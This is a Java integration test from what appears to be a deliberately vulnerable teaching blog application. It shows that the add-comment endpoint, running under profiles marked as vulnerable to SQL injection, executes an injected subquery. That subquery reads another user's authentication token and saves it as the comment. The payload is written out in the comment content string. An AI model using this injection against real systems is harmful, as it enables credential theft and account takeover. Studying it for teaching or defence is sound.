package pl.kul.blog.infrastructure.sqlinjection;

import org.assertj.core.api.Assertions;
import org.junit.jupiter.api.Disabled;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.test.context.ActiveProfiles;
import pl.kul.blog.domain.comment.Comment;
import pl.kul.blog.domain.post.Post;
import pl.kul.blog.domain.post.PostRepository;
import pl.kul.blog.helpers.blogposts.AlreadyExistingPostFixtures;
import pl.kul.blog.helpers.blogposts.BlogPostTestingHelper;
import pl.kul.blog.helpers.client.utils.AddCommentRequest;
import pl.kul.blog.helpers.client.utils.AddCommentRequestFixtures;
import pl.kul.blog.helpers.users.UsersTestingHelper;
import pl.kul.blog.infrastructure.api.BaseIntegrationTest;

import javax.sql.DataSource;
import java.util.List;

import static pl.kul.blog.helpers.users.AlreadyExistingUserFixtures.janusz;
import static pl.kul.blog.helpers.users.AlreadyExistingUserFixtures.zbigniew;

@ActiveProfiles({
    "comments-vulnerable-to-sql-injection",
    "token-auth-check-vulnerable-to-sql-injection"
})

public class SqlInjection_exploitAddComment extends BaseIntegrationTest {
    @Autowired
    BlogPostTestingHelper blogPosts;
    @Autowired
    UsersTestingHelper users;
    @Autowired
    PostRepository postRepository;

    @Autowired
    DataSource dataSource;


    @Test
    void add_comment_allows_to_execute_injected_sql_and_set_result_as_content_of_the_comment() {
        // given
        users.userExists(it -> it.janusz());
        users.userExists(it -> it.zbigniew());
        // and
        Post existingPost = blogPosts.exists(AlreadyExistingPostFixtures.somePost()
            .postedBy(janusz())
            .withNoComments()
        );
        // and
        AddCommentRequest request = AddCommentRequestFixtures.validRequest().withBodyBut(it ->
            it.withAddToPostId(existingPost)
                .withContent("' + (select token from user_device where user_account_id = (select id from user_account where username = 'zbigniew')) + '")
        );

        // when
        ResponseEntity<String> response = testing.as(janusz()).sendPutAddComment(request);

        // then
        Assertions.assertThat(response.getStatusCode()).isEqualTo(HttpStatus.OK);
        // and
        List<Comment> actualComments = blogPosts.getCommentsOf(existingPost);
        Assertions.assertThat(actualComments).hasSize(1);
        // and
        Comment firstComment = actualComments.get(0);
        Assertions.assertThat(firstComment.getContent()).isEqualTo(users.tokenOf(zbigniew()));
    }
}
